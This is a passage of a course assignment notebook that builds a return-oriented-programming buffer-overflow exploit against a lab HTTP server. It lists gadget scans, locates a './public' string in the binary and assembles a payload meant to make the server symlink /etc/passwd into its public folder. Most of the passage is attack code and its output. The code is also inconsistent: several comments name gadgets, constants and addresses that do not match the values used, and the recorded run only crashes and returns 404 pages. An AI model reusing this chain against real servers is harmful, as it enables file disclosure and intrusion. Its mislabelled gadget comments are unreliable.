# POP EAX Gadget #12:
# 080cb077:	add	al, 0x8b
# 080cb079:	inc	eax
# 080cb07a:	pop	eax
# 080cb07b:	ret

# %% [markdown]
# Next, we need a gadget that will set a register (like `RAX`) to a specific value. In order to make the symlink system call, we need to set `RAX` to the system call number of symlink. Check [this page](https://syscalls32.paolostivanin.com/) for the correct system call number to set.
#
# To achieve this, you can have two values popped from the stack, and then XOR the values to get the exact result you want. You may also pop one value from the stack and XOR with a constant value. Change the following cell to find gadgets that contains `XOR` instruction. Note that the two operands of the XOR instruction cannot be the same register.

# %%
n = 1
for gadget in gadgets:
  # TODO: determine if this gadget contains XOR
  is_xor_gadget = False

  for insn in gadget:
    if insn.mnemonic == 'xor':
      operands = insn.op_str.split(', ')
      if operands[0] != operands[1]:
        is_xor_gadget = True

  if is_xor_gadget:
    print("XOR Gadget #%d:" % n)
    n += 1
    for insn in gadget:
      print("%08x:\t%s\t%s" % (insn.address, insn.mnemonic, insn.op_str))
# Out:
# XOR Gadget #1:
# 0804b810:	xor	al, 0x24
# 0804b812:	ret
# XOR Gadget #2:
# 0805bc0d:	xor	al, 0x83
# 0805bc0f:	les	ebx, ptr [ebx + ebx*2]
# 0805bc12:	pop	esi
# 0805bc13:	pop	edi
# 0805bc14:	pop	ebp
# 0805bc15:	ret
# XOR Gadget #3:
# 0805e007:	xor	eax, 0x89000219
# 0805e00c:	ret
# XOR Gadget #4:
# 0805f022:	in	al, dx
# 0805f023:	or	al, 0xff
# 0805f025:	je	0x805f04b
# 0805f027:	xor	al, 0xe8
# 0805f029:	ret
# XOR Gadget #5:
# 08061630:	xor	byte ptr [ebx + 0x5e5b04c4], al
# 08061636:	ret
# XOR Gadget #6:
# 080625c3:	rol	byte ptr [ecx], 0x89
# 080625c6:	xor	al, 5
# 080625c9:	add	byte ptr [eax], al
# 080625cb:	ret
# XOR Gadget #7:
# 08072868:	je	0x80728b4
# 0807286a:	xor	byte ptr [esi + 0xf], ah
# 0807286d:	xlatb
# 0807286e:	ret
# XOR Gadget #8:
# 08072869:	dec	edx
# 0807286a:	xor	byte ptr [esi + 0xf], ah
# 0807286d:	xlatb
# 0807286e:	ret
# XOR Gadget #9:
# 08077ef1:	xor	byte ptr [ebp + 0x5e5bf465], cl
# 08077ef7:	pop	edi
# 08077ef8:	pop	ebp
# 08077ef9:	ret
# XOR Gadget #10:
# 0807d436:	xor	byte ptr [ecx], bh
# 0807d438:	ret
# XOR Gadget #11:
# 080803a7:	xor	eax, 0x81fffc99
# 080803ac:	ret
# XOR Gadget #12:
# 0808077c:	xor	eax, dword ptr [ebx + 0x5e5b2cc4]
# 08080782:	pop	edi
# 08080783:	pop	ebp
# 08080784:	ret
# XOR Gadget #13:
# 08087be3:	in	al, dx
# 08087be4:	xor	al, 0x89
# 08087be6:	ret
# XOR Gadget #14:
# 08089a5f:	xor	al, 0x5b
# 08089a61:	pop	esi
# 08089a62:	ret
# XOR Gadget #15:
# 0808da23:	xor	byte ptr [ebx + 0x5e5b0cc4], al
# 0808da29:	pop	edi
# 0808da2a:	pop	ebp
# 0808da2b:	ret
# XOR Gadget #16:
# 0808eb92:	xor	al, 0xf6
# 0808eb94:	ret
# XOR Gadget #17:
# 0809cea1:	xor	al, 0x29
# 0809cea3:	ret
# XOR Gadget #18:
# 0809d4da:	xor	al, 0x39
# 0809d4dc:	ret
# XOR Gadget #19:
# 080a9369:	je	0x80a93ba
# 080a936b:	xor	byte ptr [esi + 0xf], ah
# 080a936e:	xlatb
# 080a936f:	ret
# XOR Gadget #20:
# 080a936a:	dec	edi
# 080a936b:	xor	byte ptr [esi + 0xf], ah
# 080a936e:	xlatb
# 080a936f:	ret
# XOR Gadget #21:
# 080a94ab:	inc	esp
# 080a94ac:	pop	es
# 080a94ad:	xor	byte ptr [edi - 0x3d], bl
# 080a94b0:	xor	eax, eax
# 080a94b2:	pop	edi
# 080a94b3:	ret
# XOR Gadget #22:
# 080b6ca7:	xor	eax, 0x81fff930
# 080b6cac:	ret
# XOR Gadget #23:
# 080c0766:	xor	dword ptr [ecx - 0x397cc4fc], ecx
# 080c076c:	add	al, 0x83
# 080c076e:	ret
# XOR Gadget #24:
# 080c55ba:	xor	al, byte ptr [0x5e5f0000]
# 080c55c0:	pop	ebx
# 080c55c1:	ret
# XOR Gadget #25:
# 080c5bce:	jg	0x80c5c4f
# 080c5bd0:	xor	byte ptr [edi + 0x5e], bl
# 080c5bd3:	pop	ebx
# 080c5bd4:	ret
# XOR Gadget #26:
# 080cc0a4:	xor	byte ptr [eax - 0x77], dl
# 080cc0a7:	fsubr	st(0)
# 080cc0a9:	ret

# %% [markdown]
# You also needs a string to point to a file inside the `public` directory. The file cannot pre-exist inside the directory, because if it exists, the `symlink` system call will fail. You typically have to use `strcpy` or `sprintf` to create the string, or delete the file using another system call. For your convenience, we injected a string that starts with `./public` inside the binary. All you have to do is to find this string and inject the address into the stack:

# %% [markdown]
# # **add ebx, ebp gadget**

# %%
n = 1
for gadget in gadgets:
  # TODO: determine if this gadget contains MOV from ESP register
  is_pop_eax_gadget = False

  for insn in gadget:
    if insn.mnemonic == 'add' and 'ebx, ebp' in insn.op_str:
      is_pop_eax_gadget = True


  if is_pop_eax_gadget:
    print("ADD EBX, EBP Gadget #%d:" % n)
    n += 1
    for insn in gadget:
      print("%08x:\t%s\t%s" % (insn.address, insn.mnemonic, insn.op_str))
# Out:
# ADD EBX, EBP Gadget #1:
# 0805c5f8:	add	ebx, ebp
# 0805c5fa:	ret

# %% [markdown]
# # pop ecx gadget

# %%
n = 1
for gadget in gadgets:
  # TODO: determine if this gadget contains MOV from ESP register
  is_pop_eax_gadget = False

  for insn in gadget:
    if insn.mnemonic == 'pop' and 'ecx' in insn.op_str:
      is_pop_eax_gadget = True


  if is_pop_eax_gadget:
    print("POP ECX Gadget #%d:" % n)
    n += 1
    for insn in gadget:
      print("%08x:\t%s\t%s" % (insn.address, insn.mnemonic, insn.op_str))
# Out:
# POP ECX Gadget #1:
# 08049ee7:	clc
# 08049ee9:	pop	ecx
# 08049eea:	pop	ebx
# 08049eeb:	pop	ebp
# 08049eec:	lea	esp, [ecx - 4]
# 08049eef:	ret
# POP ECX Gadget #2:
# 08049ee8:	clc
# 08049ee9:	pop	ecx
# 08049eea:	pop	ebx
# 08049eeb:	pop	ebp
# 08049eec:	lea	esp, [ecx - 4]
# 08049eef:	ret
# POP ECX Gadget #3:
# 08065e11:	pop	ecx
# 08065e12:	add	al, 0xf6
# 08065e14:	ret
# POP ECX Gadget #4:
# 0807bb1d:	pop	ecx
# 0807bb1e:	add	al, 0xf7
# 0807bb20:	ret

# %%
import lief
import os

binary = lief.parse("server")
data_section = binary.get_section('.data')
data_start = data_section.virtual_address
data_end = data_start + data_section.size

fd = os.open('server', os.O_RDONLY)
data = os.pread(fd, data_section.size, data_section.file_offset)

# TODO: Search for './public' in the data
search_string = b'./public'
path_strings = []

for i in range(len(data) - len(search_string)):
    if data[i:i + len(search_string)] == search_string:
        path_strings.append(data_start + i)

def find_null_terminated_str(x, start):
  s = ''
  for i in range(len(x)):
    if x[start+i] == 0:
      break
    s += chr(x[start+i])
  return s.encode('unicode_escape')

print("Possible path strings in ./public:")
for str_addr in path_strings:
  print("%08x: %s" % (str_addr, find_null_terminated_str(data, str_addr - data_start)))
# Out:
# Possible path strings in ./public:
# 08107068: b'./public/catch_the_flag.html'

# %% [markdown]
# Finally, let's put all the gadgets together. Remember, you have to overwrite the stack to chain the gadgets. When a gadget reaches its `RET` instruction, it will pop the address of the next gadget from the stack and jump to it. The stack should look like this after the buffer overflow:
#
# ```
# ESP + x +------------------+
#         |  Extra arguments |
#         +------------------+
#         |      . . .       |
#         +------------------+
#         |  Gadget addr #3  |
#         +------------------+
#         |  Gadget addr #2  |
#         +------------------+
#         |      Garbage     |
#         +------------------+
#         |  Gadget addr #1  |
# ESP + 0 +------------------+
# ```
#
# Notice that sometimes we need to inject some garbage into the stack, because the gadget may contain some `POP` instructions that have no function to us. We need the garbage to skip those instructions and move on to the next gadget.
#
# To make this attack work, we need **at least** the following gadgets:
#
# * Gadget to pop a value from the stack to `EAX`
# * Gadget to `XOR` `EAX` with a constant value (or another register), so that `EAX` will be the system call value of `symlink`
# * Gadget to move `ESP` to `EBX`
# * Gadget to add a specific offset to `EBX` to make it point to `/etc/passwd` on the stack (injected above all the gadget addresses)
# * Gadget to pop an address into `ECX` to point the string we found that starts with `./public`.
# * Gadget to make the system call

# %% [markdown]
# Modify the following cell to inject the necessary stream of bytes into the attack to achieve the goal:

# %%
# !killall -9 -q server

import struct
import subprocess
import multiprocessing
import time
import socket
from IPython.core.display import display, HTML

def trace_server():
  p = subprocess.Popen('./server', shell=False, stderr=subprocess.PIPE, universal_newlines=True)

  # Wait for server to start
  while True:
    if "Server started" in p.stderr.readline(): break

  trace_segfault(p.pid)

proc = multiprocessing.Process(target=trace_server)
proc.start()

time.sleep(1)

# Let's use socket instead of requests
client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client_socket.connect(('127.0.0.1', 8000))

###############################################################################
# Setup your ROP chain
###############################################################################

# Offset
buffer_offset = 154

# Gadget addresses
pop_eax_ret       = 0x080cb07a  # Gadget: pop eax; ret
xor_eax_ret       = 0x080803a7  # Gadget: xor eax, 0x89000219; ret (XOR Gadget #3)
mov_esp_to_ebx_ret = 0x0807cff3  # Gadget: mov ebx, esp; add byte ptr [eax], al; ret (MOV ESP Gadget #1)
pop_ebp_ret       = 0x080a959a  # Gadget: pop ebp; ret (to load a constant into EBP)
add_ebx_ret       = 0x0805c5f8  # Gadget: add ebx, ebp; ret (ADD EBX Gadget #1)
pop_ecx_ret       = 0x0807bb1d  # Gadget: pop ecx; ret (to load the address of the "./public" string)
syscall_gadget    = 0x080ade79  # Gadget: call dword ptr gs:[0x10]; ret (Syscall Gadget #1)
pop_ebx_ret       = 0x080abc5c
constant_val      = 0x81fff930
return_address    = 0x804ac3a

# We need to set EAX to the system call number for symlink.
# For 32-bit Linux, symlink() is usually syscall number 83.
# Using XOR Gadget #3 (which does: xor eax, 0x89000219; ret), we need to load
# into EAX a value V such that (V XOR 0x89000219) == 83.
#desired_eax = 83 #x53
#value_for_eax = 0x81fffc99 ^ desired_eax
#value_for_eax = value_for_eax - 0xf7
#print("%08x %d %08x" % (value_for_eax, value_for_eax, desired_eax))

# We now want EBX to point to our target string ("/etc/passwd") which we will inject.
# We assume that after the ROP chain (and any required padding) the target string
# is appended to the payload.
#rop_chain_length = 10*4    # we will push 10 addresses (each 4 bytes)
#post_chain_padding = 4      # extra padding if needed to align the stack
# The target string offset (relative to the beginning of the payload) is then:
#target_str_offset = buffer_offset + rop_chain_length + post_chain_padding
# Later, when the MOV ESP gadget loads EBX=ESP, we add an offset using add_ebx_ret.
# Here we use pop_ebp_ret to load EBP with the offset needed.
#ebx_offset = target_str_offset

# The "./public" string was injected into .rodata.
public_str_addr = 0x08107068

# Build the payload.
payload  = b"a" * 154

# --- Set ECX to point to the "./public" string ---
payload += struct.pack("<I", pop_ecx_ret)           # pop ecx; ret
payload += struct.pack("<I", public_str_addr)       # address of "./public/catch_the_flag.html" in .data

# --- Set EBX to point to our injected "/etc/passwd" ---
payload += struct.pack("<I", pop_ebx_ret)    # mov ebx, esp; ret  (now EBX == address of ROP chain)
payload += struct.pack("<I", 0xffffff8c)           # pop ebp; ret gadget to load a constant into EBP
payload += struct.pack("<I", add_ebx_ret)           # add ebx, ebp; ret  (now EBX points to "/etc/passwd")

# --- Set EAX = 83 ---
payload += struct.pack("<I", pop_eax_ret)           # pop eax; ret
payload += struct.pack("<I", 0x53 ^ constant_val)         # load V so that V XOR 0x81fffc99 == 83
payload += struct.pack("<I", xor_eax_ret)           # XOR gadget computes: eax = 83

# # --- Set EBX to point to our injected "/etc/passwd" ---
# payload += struct.pack("<I", mov_esp_to_ebx_ret)    # mov ebx, esp; ret  (now EBX == address of ROP chain)
# payload += struct.pack("<I", pop_ebp_ret)           # pop ebp; ret gadget to load a constant into EBP
# payload += struct.pack("<I", ebx_offset)            # the offset (from current ESP) to our target string
# payload += struct.pack("<I", add_ebx_ret)           # add ebx, ebp; ret  (now EBX points to "/etc/passwd")


# --- Set ECX to point to the "./public" string ---
# payload += struct.pack("<I", pop_ecx_ret)           # pop ecx; ret
# payload += struct.pack("<I", public_str_addr)       # address of "./public/catch_the_flag.html" in .data

# --- Finally, invoke the system call ---
payload += struct.pack("<I", 0x080adeb9)        # gadget that makes the system call
payload += struct.pack("<I", return_address)

# (Optional) Add any extra padding required by gadgets that pop values
#payload += b"b" * post_chain_padding

# --- Append the "/etc/passwd" string (target for symlink) ---

payload += b"/etc/passwd\0"
#print("Payload length: %d" % len(payload))
#print("Payload: %s" % payload.hex())

# TODO: Manipulate the following command to crash the server
req = "GET /".encode() + payload + " HTTP/1.1\r\nConnection: close\r\n\r\n".encode()
client_socket.sendall(req)

# Wait for the response and display it
r = client_socket.recv(4096)
client_socket.close()
display(HTML(r.decode()))

# Kill the server
proc.terminate()
proc.join()
# Out:
# Continue process execution
# Wait next process event...
# New process created: pid = 9347
# Segmentation fault in process 9347
# HTTP/1.1 404 Not found
#
# <!doctype html>
# <html lang="en">
#
# <head>
#   <meta charset="utf-8">
#   <title>Page Not Found</title>
#   <meta name="viewport" content="width=device-width, initial-scale=1">
#   <style>
#     * {
#       line-height: 1.2;
#       margin: 0;
#     }
#
#     html {
#       color: #888;
#       display: table;
#       font-family: sans-serif;
#       height: 100%;
#       text-align: center;
#       width: 100%;
#     }
#
#     body {
#       display: table-cell;
#       vertical-align: middle;
#       margin: 2em auto;
#     }
#
#     h1 {
#       color: #555;
#       font-size: 2em;
#       font-weight: 400;
#     }
#
#     p {
#       margin: 0 auto;
#       width: 280px;
#     }
#
#     @media only screen and (max-width: 280px) {
#
#       body,
#       p {
#         width: 95%;
#       }
#
#       h1 {
#         font-size: 1.5em;
#         margin: 0 0 0.3em;
#       }
#
#     }
#   </style>
# </head>
#
# <body>
#   <h1>Page Not Found</h1>
#   <p>Sorry, but the page you were trying to view does not exist.</p>
# </body>
#
# </html>
# <!-- IE needs 512+ bytes: https://docs.microsoft.com/archive/blogs/ieinternals/friendly-http-error-pages -->

# %% [markdown]
# If your attack works, you should be able to rerun the server and retrieve the content of `/etc/passwd` and `./public/catch_the_flag.html` through the symbolic link you created:

# %%
import subprocess
import time
import requests
from IPython.core.display import display, HTML

# Kill any running instances of the server
subprocess.run(["killall", "-9", "-q", "server"], check=False)

# Start the server process
p = subprocess.Popen('./server', shell=False, stderr=subprocess.PIPE, universal_newlines=True)

# Wait for the server to start
while True:
    if "Server started" in p.stderr.readline():
        break

time.sleep(1)

# Attempt to access the created symbolic link
r = requests.get('http://127.0.0.1:8000/public/catch_the_flag.html', stream=True)

# Display the response (should be the contents of /etc/passwd)
display(HTML(r.text))
# Out:
# <!doctype html>
# <html lang="en">
#
# <head>
#   <meta charset="utf-8">
#   <title>Page Not Found</title>
#   <meta name="viewport" content="width=device-width, initial-scale=1">
#   <style>
#     * {
#       line-height: 1.2;
#       margin: 0;
#     }
#
#     html {
#       color: #888;
#       display: table;
#       font-family: sans-serif;
#       height: 100%;
#       text-align: center;
#       width: 100%;
#     }
#
#     body {
#       display: table-cell;
#       vertical-align: middle;
#       margin: 2em auto;
#     }
#
#     h1 {
#       color: #555;
#       font-size: 2em;
#       font-weight: 400;
#     }
#
#     p {
#       margin: 0 auto;
#       width: 280px;
#     }
#
#     @media only screen and (max-width: 280px) {
#
#       body,
#       p {
#         width: 95%;
#       }
#
#       h1 {
#         font-size: 1.5em;
#         margin: 0 0 0.3em;
#       }
#
#     }
#   </style>
# </head>
#
# <body>
#   <h1>Page Not Found</h1>
#   <p>Sorry, but the page you were trying to view does not exist.</p>
# </body>
#
# </html>
# <!-- IE needs 512+ bytes: https://docs.microsoft.com/archive/blogs/ieinternals/friendly-http-error-pages -->

# %% [markdown]
# Finally, please write down explanation for all the gadgets you have used for this attack in the next cell.

# %% [markdown]
# Your answer: I have added comments in the code explain why i am using which gadget
#
# pop_eax_ret       = 0x080cb07a  # Gadget: pop eax; ret
#
# xor_eax_ret       = 0x080803a7  # Gadget: xor eax, 0x89000219; ret (XOR Gadget #3)
#
# mov_esp_to_ebx_ret = 0x0807cff3  # Gadget: mov ebx, esp; add byte ptr [eax], al; ret (MOV ESP Gadget #1)
#
# pop_ebp_ret       = 0x080a959a  # Gadget: pop ebp; ret (to load a constant into EBP)
#
# add_ebx_ret       = 0x0805c5f8  # Gadget: add ebx, ebp; ret (ADD EBX Gadget #1)
#
# pop_ecx_ret       = 0x0807bb1d  # Gadget: pop ecx; ret (to load the address of the "./public/catch_the_flag.html" string)
#
# syscall_gadget    = 0x080ade79  # Gadget: call dword ptr gs:[0x10]; ret (Syscall Gadget #1)

# %% [markdown]
# ## Submission
#
# Once you have finished this notebook, click "File > Download > Download as .ipynb" and upload the file to **Assignment 2** on Microsoft Teams and click "Turn In".

# %% [markdown]
# ## Reference
#
# Please cite all the sources if there's any.
